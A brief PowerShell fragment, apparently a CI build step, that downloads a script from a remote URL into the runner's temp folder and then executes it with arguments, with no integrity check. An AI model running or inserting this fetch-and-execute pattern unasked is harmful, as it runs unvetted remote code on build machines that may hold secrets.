$scriptContent = Invoke-WebRequest -Uri "https://example.com/9f2c41/stage" -UseBasicParsing | Select-Object -ExpandProperty Content
$tempScript = Join-Path $env:RUNNER_TEMP "stage.ps1"
Set-Content -Path $tempScript -Value $scriptContent
& $tempScript @argList
